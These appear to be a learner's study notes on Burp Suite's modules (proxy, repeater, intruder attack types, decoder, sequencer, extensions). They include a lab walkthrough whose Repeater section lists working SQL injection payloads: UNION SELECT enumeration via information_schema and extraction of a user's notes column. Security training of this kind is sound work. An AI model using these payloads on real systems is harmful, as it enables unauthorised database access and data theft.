PREFACE:
MAKES MOST SENSE TO WALK THROUGH BURP ON YOUR OWN TIME/
ALONGSIDE THESE ROOMS, AS IT IS VERY INTERACTIVE

_____________________
Burp Suite: The Basics
----------------------
web application security testing framework

captures and allows manipulation of HTTP(S) traffic between browser and web server

proxy: enables interception/modification of requests/reponses to/from web app
repeater: capture, modify, and resend same request multiple times
	useful for trial and error payloads (SQLi) or testing endpoint functionality
intruder: allows for spraying endpoints with requests
	commonly used for brute-force or fuzzing attacks
decoder: decodes captured information or encodes payloads before sending to target
comparer: enables comparison of two pieces of data either at word or byte level
sequencer: employed when assessing randomness of tokens, such as session cookies
	checks if the algorithm used for generating those values lacks secure randomness,
	which could lead to devastating attacks

Burp also supports third-party extensions that can be downloaded on the BApp store
Ex.) Logger++ module can extend built-in logging functionality of Burp

to use burp suite proxy, we must first configure our local web browser to redirect
	traffic through it (Foxy Proxy IP: 127.0.0.1, Port: 8080)

the target tab provides more control over the scope of testing; sub-tabs:
1. site map allows mapping of web app in a tree structure
	automatically generated by simply browsing the web app
2. issue definitions 
	list of vulnerabilities, with descriptions and references
	helps potentially "define" vulnerabilites found during teting
3. scope settings
	control target scope, such as including/excluding domains/IPs

adding target within target tab will limit logging to only what is in scope
to prevent proxy from intercepting anything out of scope, go to proxy settings
	and select And URL is in target scope from "intercept client requests"

if we have issue with burp's certificate not being trusted, we can manually add
	it to our list of certificates
https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox








___________________
Burp Suite Repeater
-------------------
enables us to modify/resend intercepted requests from Burp Proxy many times
useful for manual exploration and testing of endpoints as different requests yield different responses

captured requests from the Proxy module are transmitted to repeater for further editing
	and resending
you can view modification history, allowing forward/backward movement as needed

the response can be viewed in forms: pretty, raw, hex, render (as it would in browser)
	pretty option is generally sufficient

Inspector feature (on the right side) provides a visually organized breakdown
	of requests/responses by separating cookies, params, headers, etc.

suited for tasks requiring repetitive sending of similar requests (typically with minor
	modifications), such as SQLi, attempting to bypass WAFs, adjusting
	params in a form submission, etc.

PRACTICAL:
Capture request to the specified site: http://10.10.81.16/about/2
However, forward request with apostrophe http://10.10.81.16/about/2'

Considering this is returned: 
SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'

we can skip the query column number and table name enumeration
add
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
to request and we receive

TRYING BLINDLY BASED ON SQLi NOTES (BOOLEAN-BASED)

	GET /about/0 UNION SELECT 1,2,3,4,5;--
I continued adding numbers until I no longer received a 500 error
	5 columns being pulled (doesn't necessarily mean the total number is the same)

by changing 2 to 0 (which is invalid) we ensure we dont retreieve anything with the legitimate query

Had issue trying to find db name using:
	 UNION SELECT 1,2,3 where database() like '%';

based on us knowing the table name, we can try to get column names:

ALL SELECT column_name, null, null, null, null FROM information_schema.columns where table_name = 'people';-- HTTP/1.1
returns 
About | id None
we now know the name of the first column, but we need to use group_concat(column_name)
	to amalgamate all column names into a single output
returns
About | id,firstName,lastName,pfpLink,role,shortRole,bio,notes None

we know ceo id is 1 just by looking at the url
the objective was to retrieve the notes so the following query accomplishes our task:

0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
wondering why i didn't need "people"....but flag found so eh







_____________
Burp Intruder
-------------
offers automated request manipulation and allows fuzzing, brute-forcing, etc.

Symbol for navigating payloads: ยง
These positions can be added, removed, or auto-detected

a payload set can consist of multiple params, such as username/password
settings, processing, and encoding allows more payload flexibility

attack types:
1. sniper- default, cycles through payloads, inserting at each defined position in linear fashion
	total number of requests: requests = numberOfWords * numberOfPositions
	essentially, goes through first param with wordlist and then the second with wordlist


2. battering ram - differs from sniper, as all payloads are sent simultaneously
	useful when testing race conditions or payloads need to be sent concurrently 
	each payload from wordlist is inserted into every position for each request made
	wordlist: admin, alex, brian
	ex. username=admin&password=admin, user=alex;pass=alex, user=brian;pass=brian 

3. pitchfork - simulatenously test multiple positions with different payloads
	allows tester to define multiple payload sets, each associated with a specific position
	effective when there are distinct parameters that need separate testing
	ex. if we had worlist containing user1, user2, user3 and another pass1, pass2, pass3
		then user1pass1 ,user2pass2, user3pass3

5. cluster bomb - performs sniper-like attack on each position but simultaneously
	tests all payloads from each set
	useful when multiple positions have different payloads, but we want to test them all together
	essentially all possible combinations
	wordlist1: joel, harriet, alex
	wordlist2: pass1, pass2, pass3
	joelpass1, joelpass2, joelpass3, harrietpass1, harrietpass2, etc.
	if we had 3 payload sets, 100 lines, 2 lines, 30 lines, then we have 6000 requests
	lengths of sets multiplied together



_________________________
Burp Suite: Other Modules
-------------------------
~ Decoder ~
decodes intercepted data, provides function to encode data for transmission
can also create hashsums of data
smart decode attempts to decode data recursively until back to plaintext

options:
1. plain - raw text
2. url - used to ensure safe transfer of data in url of web request
	/ -> %2f
3. html - replaces special characters with ampersand, followed by hex # or reference to character being escaped, ending in semicolon
	&quot; -> "
4. base64 - most common encoding method, converts data into ascii-compatible format
5. ascii hex - transitions data between ascii and hexadecimal representation
	"ASCII" -> "4153434949"
6. hex, octal binary - encoding methods apply solely to numeric inputs
7. gzip - compresses data, reducing file and page sizes before transmission

decoder can also be used for hashing purposes
	command: md5sum file finds md5 hashsum



~ Comparer ~
compares two pieces of data, either by ascii words or by bytes
useful when comparing two responses with different lengths to see where differences lie, ex. successful vs unsuccessful login



~ Sequencer ~
evaluates entropy (or randomness) of "tokens"
	tokens are strings used for identification and should be generated in a cryptographically secure maner
	if not generated securely, theoretically could predict upcoming token values

live capture - most commont method, passes requests and generates token for analysis
	same request is made thousands of times, storing generated token samples for analysis once enough are collected
manual load - supply list of pre-generated token samples directly into sequencer
	less noisy and resource-intensive; however, requires we have large list of pre-generated tokens

entropy summary:
1. overall result - broad assessment of security of token generation mechanism
2. effective entropy - measures token randomness; 117 bits is relatively high, indicating sufficiently random in example
3. reliability - level of confidence, providing assurance in accuracy of entropy estimation
4. sample - details about the token samples, including number of them and their characteristics



~ Organizer ~
stores/annotates copies of http requests you may want to revisit later
	particularly useful for organizing pentesting workflow
	you can store requests for later investigation, one's you're interested in, those to add to a report, etc.
each http request sent is a read-oly copy of the original request saved at the point it was sent to organizer

requests are stored in a table, containing columns such as request index #, time of request, workflow status,
	burp tool used, http method, server hostname, url file path, url query string, # of request parameters,
	response status code, response length in bytes, any other notes you've made




_____________________
Burp Suite: Extensions
----------------------
Extensions interface provides overview of extensions loaded into the tools
	list of extensions
	add, remove, up/down (managing extensions)
		extensions are applied in desc order (top to bottom) *essential to avoid interference*
	details of extension, output during execution, any errors during execution

you might want to activate/deactivate extensions based on project specifics

BApp Store (Burp App Store) allows us to discover/integrate official extensions
	found in Extensions tab, search for extension and relevant details are listed

~ Jython ~
to use python modules in burp, we need to include the jython interpreter JAR file (java implementation of python)
	enables us to run python-based extensions within burp suite

steps to integrate:
1. visit https://www.jython.org/download , download standalone option
	above caused issues...succesful download from: https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.3/

2. in burp, navigate to extensions settings sub-tab
3. scroll down to python environment section
4. set "location of jython standalone jar file" fiel to the download

this integration significantly increases the # of available extensions and enhances capabilities substantially

~ burp suite api ~
wide range of api endpoints to create/integrate modules with burp suite, each with a various functionality

languages supported for writing extensions:
1. java (natively) - directly use java to write extensions for burp
2. python (via jython) - java implementation of python
3. ruby (via jruby) - java implementation of ruby















